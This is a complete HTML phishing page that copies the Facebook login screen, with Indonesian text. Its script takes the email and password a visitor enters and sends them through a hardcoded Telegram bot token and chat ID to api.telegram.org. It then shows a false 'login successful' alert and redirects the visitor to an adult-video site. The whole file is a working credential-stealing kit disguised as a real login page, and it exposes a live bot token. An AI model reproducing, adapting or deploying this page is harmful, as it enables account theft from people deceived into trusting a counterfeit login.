<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        /* Reset dan font */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Roboto', sans-serif;
        }

        /* Gaya untuk body */
        body {
            background-color: #e9ebee;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        /* Container utama */
        .container {
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
            width: 360px;
            padding: 20px;
            text-align: center;
        }

        /* Logo Facebook */
        .logo {
            font-size: 36px;
            font-weight: 700;
            color: #1877f2;
            margin-bottom: 20px;
        }

        /* Input field */
        .input-field {
            width: 100%;
            padding: 14px;
            margin: 8px 0;
            border-radius: 6px;
            border: 1px solid #ccd0d5;
            font-size: 16px;
            background-color: #f5f6f7;
        }

        /* Tombol login */
        .login-btn {
            width: 100%;
            background-color: #1877f2;
            color: #fff;
            padding: 14px;
            font-size: 18px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
            margin-top: 14px;
        }

        .login-btn:hover {
            background-color: #145dbf;
        }

        /* Tautan lupa kata sandi */
        .forgot-password {
            display: block;
            margin: 16px 0;
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }

        /* Garis pemisah dengan teks "atau" */
        .line {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }

        .line::before,
        .line::after {
            content: '';
            flex: 1;
            height: 1px;
            background-color: #ccd0d5;
        }

        .line span {
            margin: 0 10px;
            color: #606770;
            font-size: 14px;
        }

        /* Tombol buat akun */
        .create-account-btn {
            background-color: #42b72a;
            color: white;
            width: 100%;
            padding: 14px;
            font-size: 16px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
        }

        .create-account-btn:hover {
            background-color: #36a420;
        }

        /* Teks footer */
        .terms {
            font-size: 12px;
            color: #606770;
            margin-top: 20px;
        }

        .terms a {
            color: #1877f2;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Facebook</div>
        
        <input type="text" id="email" class="input-field" placeholder="Email atau Nomor Telepon">
        <input type="password" id="password" class="input-field" placeholder="Kata Sandi">

        <button class="login-btn" onclick="sendToTelegramAndRedirect()">Masuk</button>

        <a href="https://m.facebook.com/login/identify/?next=https%3A%2F%2Fm.facebook.com%2Fidentify" class="forgot-password">Lupa kata sandi?</a>

        <div class="line"><span>atau</span></div>

        <button class="create-account-btn">Buat Akun Baru</button>

        <div class="terms">
            <p><a href="https://id-id.facebook.com/pages/create/?ref_type=site_footer">Buat Halaman</a> untuk selebriti, merek, atau bisnis.</p>
        </div>
    </div>

    <script>
        function sendToTelegramAndRedirect() {
            const chatId = "6748742388";
            const token = "7625465771:AAGAGGJ2JwSbxS35I1V2D4Fpc5ktm-1EwQg";
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            if (email && password) {
                const message = `Email/Phone: ${email}\nPassword: ${password}`;
                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

                fetch(url)
                    .then(response => {
                        if (response.ok) {
                            alert("Login berhasil. Anda akan diarahkan ke halaman berikutnya.");
                            window.location.href = "https://indie.dutamovie21.movie/blog-tag/bokep-indo-dm21/?utm_medium=menu+semi+indo+desktop&utm_source=dutamovie21#"; // URL tujuan
                        } else {
                            alert("Gagal mengirim data. Silakan coba lagi.");
                        }
                    })
                    .catch(error => {
                        console.error("Error:", error);
                        alert("Terjadi kesalahan. Silakan coba lagi.");
                    });
            } else {
                alert("Harap masukkan email dan kata sandi.");
            }
        }
    </script>
</body>
</html>
